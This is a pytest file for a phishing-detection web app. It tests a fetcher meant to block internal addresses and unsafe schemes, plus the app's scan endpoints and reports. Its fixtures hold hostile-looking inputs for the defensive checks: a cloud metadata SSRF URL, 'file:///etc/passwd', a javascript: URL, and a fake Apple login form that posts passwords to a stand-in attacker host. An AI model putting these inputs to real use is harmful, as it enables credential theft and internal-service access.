"""
v3 tests: safe fetcher, baselines, comparison report, app endpoints.
Run from the project root:   python3 -m pytest tests -q     (or: python3 tests/test_v3.py)
No internet needed: a throw-away local HTTP server stands in for "the web".
"""
import http.server
import os
import sys
import threading

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from src import fetcher


# ---------- a tiny local web server used only by these tests ----------
class _H(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def do_GET(self):
        if self.path == "/page":
            body = b"<html><body><form action='http://evil.example/x'><input type='password'></form></body></html>"
            self.send_response(200); self.send_header("Content-Type", "text/html; charset=utf-8")
        elif self.path == "/json":
            body = b"{}"; self.send_response(200); self.send_header("Content-Type", "application/json")
        elif self.path == "/big":
            body = b"<html>" + b"a" * 3_000_000; self.send_response(200); self.send_header("Content-Type", "text/html")
        elif self.path == "/redir":
            body = b""; self.send_response(302); self.send_header("Location", "http://169.254.169.254/latest/meta-data/")
        elif self.path == "/loop":
            body = b""; self.send_response(302); self.send_header("Location", "/loop")
        elif self.path == "/403":
            body = b"nope"; self.send_response(403); self.send_header("Content-Type", "text/html")
        else:
            body = b"x"; self.send_response(404); self.send_header("Content-Type", "text/html")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers(); self.wfile.write(body)


def _server():
    srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), _H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv, f"http://127.0.0.1:{srv.server_address[1]}"


# ------------------------------ fetcher ---------------------------------
def test_blocks_internal_addresses_by_default():
    for u in ["http://127.0.0.1/", "http://localhost/", "http://10.0.0.5/", "http://192.168.1.1/",
              "http://169.254.169.254/latest/meta-data/", "http://[::1]/", "http://0.0.0.0/",
              "http://100.64.0.1/"]:
        r = fetcher.fetch_html(u)
        assert not r["ok"] and r["reason"] in ("blocked_address", "blocked_port"), (u, r["reason"])


def test_rejects_bad_schemes_and_credentials():
    for u in ["ftp://example.com/", "file:///etc/passwd", "javascript:alert(1)", "", "http://user:pw@example.com/"]:
        r = fetcher.fetch_html(u)
        assert not r["ok"] and r["reason"] in ("invalid_url", "blocked_port", "dns_failure"), (u, r["reason"])


def test_blocks_unusual_ports():
    r = fetcher.fetch_html("http://example.com:22/")
    assert not r["ok"] and r["reason"] == "blocked_port"


def test_fetches_html_page():
    srv, base = _server()
    r = fetcher.fetch_html(base + "/page", allow_private=True)
    srv.shutdown()
    assert r["ok"] and "type='password'" in r["html"] and r["status_code"] == 200


def test_non_html_http_error_and_size_cap():
    srv, base = _server()
    assert fetcher.fetch_html(base + "/json", allow_private=True)["reason"] == "non_html"
    assert fetcher.fetch_html(base + "/403", allow_private=True)["reason"] == "http_403"
    big = fetcher.fetch_html(base + "/big", allow_private=True)
    srv.shutdown()
    assert big["ok"] and big["truncated"] and big["bytes"] <= fetcher.DEFAULT_MAX_BYTES


def test_redirect_to_internal_address_is_refused():
    srv, base = _server()
    r = fetcher.fetch_html(base + "/redir", allow_private=False)   # first hop (127.0.0.1) already blocked
    assert not r["ok"]
    # with the first hop allowed, the redirect target must still be rechecked and refused
    orig = fetcher.validate_target
    def lenient_first(url, allow_private=False):
        return orig(url, allow_private=url.startswith(base))
    fetcher.validate_target = lenient_first
    try:
        r2 = fetcher.fetch_html(base + "/redir")
    finally:
        fetcher.validate_target = orig
        srv.shutdown()
    assert not r2["ok"] and r2["reason"] == "blocked_address"


def test_redirect_loop_stops():
    srv, base = _server()
    r = fetcher.fetch_html(base + "/loop", allow_private=True)
    srv.shutdown()
    assert not r["ok"] and r["reason"] == "too_many_redirects"


# ------------------------- app / report / baselines ----------------------
def _client(monkey_fetch=None):
    import types
    from src import app as appmod
    real = fetcher
    # give the app a stand-in fetcher module (never touch the real module's functions)
    appmod.fetcher = types.SimpleNamespace(
        fetch_html=monkey_fetch if monkey_fetch is not None else real.fetch_html,
        reason_text=real.reason_text)
    appmod.app.config["TESTING"] = True
    return appmod, appmod.app.test_client()


_PHISH_HTML = ("<html><head><title>Apple Secure Login</title></head><body>"
               "<form action='http://collect.evil.club/c.php' method='post'>"
               "<input type='text' name='u'><input type='password' name='p'></form>"
               "<iframe src='http://x.evil.club/a'></iframe></body></html>")


def _ok_fetch(url, **kw):
    return {"ok": True, "reason": "ok", "html": _PHISH_HTML, "final_url": url, "status_code": 200,
            "bytes": len(_PHISH_HTML), "truncated": False, "redirects": 0, "elapsed_ms": 12}


def _fail_fetch(url, **kw):
    return {"ok": False, "reason": "timeout", "html": "", "final_url": url, "status_code": None,
            "bytes": 0, "truncated": False, "redirects": 0, "elapsed_ms": 4000}


def test_scan_uses_fetched_html_and_builds_comparison():
    appmod, c = _client(_ok_fetch)
    r = c.post("/api/scan", json={"url": "http://apple-secure-login.evil.club/account.php", "report": True})
    j = r.get_json()
    assert r.status_code == 200 and j["used_html"] is True and j["fetch"]["status"] == "ok"
    rep = j["report"]
    assert len(rep["scan"]["baselines"]) == 4
    assert rep["scan"]["signal"]["hybrid_probability"] == j["phishing_probability"]
    assert len(rep["capability"]["rows"]) == 5 and len(rep["gaps"]) == 6


def test_fetch_failure_falls_back_to_url_only():
    appmod, c = _client(_fail_fetch)
    j = c.post("/api/scan", json={"url": "http://apple-secure-login.evil.club/account.php"}).get_json()
    assert j["used_html"] is False and j["fetch"]["status"] == "timeout"


def test_supplied_html_overrides_fetch():
    def boom(url, **kw):
        raise AssertionError("must not fetch when html is supplied")
    appmod, c = _client(boom)
    j = c.post("/api/scan", json={"url": "http://a.evil.club/", "html": _PHISH_HTML}).get_json()
    assert j["used_html"] is True and j["fetch"]["status"] == "provided"


def test_pages_and_pdfs():
    appmod, c = _client(_ok_fetch)
    page = c.post("/", data={"url": "http://apple-secure-login.evil.club/account.php"})
    html = page.get_data(as_text=True)
    assert page.status_code == 200 and "Comparison report" in html and "Download PDF report" in html
    assert 'name="html"' not in html                       # no paste box any more
    sid = list(appmod._SCAN_CACHE)[-1]
    pdf = c.get(f"/report/scan/{sid}.pdf")
    assert pdf.status_code == 200 and pdf.data[:4] == b"%PDF"
    assert c.get("/report").status_code == 200
    proj = c.get("/report.pdf")
    assert proj.status_code == 200 and proj.data[:4] == b"%PDF"
    assert c.get("/report/scan/doesnotexist.pdf").status_code == 404


def test_suspicious_verdict_is_not_shown_as_legitimate():
    appmod, c = _client(_fail_fetch)
    orig = appmod.PhishGuardModel.verdict_band
    appmod.PhishGuardModel.verdict_band = staticmethod(lambda p: "SUSPICIOUS")
    try:
        html = c.post("/", data={"url": "http://example.org/"}).get_data(as_text=True)
    finally:
        appmod.PhishGuardModel.verdict_band = orig
    assert "SUSPICIOUS" in html and "✅ LEGITIMATE" not in html


def test_saved_model_is_portable_and_loads():
    import joblib
    from src.model import MODEL_PATH, PhishGuardModel
    payload = joblib.load(MODEL_PATH)
    assert isinstance(payload["background"], dict)          # plain dict, not a pandas object
    m = PhishGuardModel.load(MODEL_PATH)
    assert m.background is not None and len(m.background) >= 40


def test_rationale_does_not_misdescribe_low_values():
    from src.llm_explainer import _template_sentence
    feats = [{"feature": "num_subdomains", "value": 0, "contribution": 0.045},
             {"feature": "is_https", "value": 0, "contribution": 0.025},
             {"feature": "iframe_count", "value": 0, "contribution": 0.01}]
    sentence = _template_sentence("SUSPICIOUS", 0.37, feats)
    assert "subdomain" not in sentence and "iframe" not in sentence and "not HTTPS" in sentence
    deep = [{"feature": "num_subdomains", "value": 4, "contribution": 0.2}]
    assert "subdomain" in _template_sentence("PHISHING", 0.9, deep)


if __name__ == "__main__":
    fails = 0
    for name, fn in sorted(globals().items()):
        if name.startswith("test_") and callable(fn):
            try:
                fn(); print("PASS", name)
            except Exception as e:
                fails += 1; print("FAIL", name, "->", repr(e))
    sys.exit(1 if fails else 0)
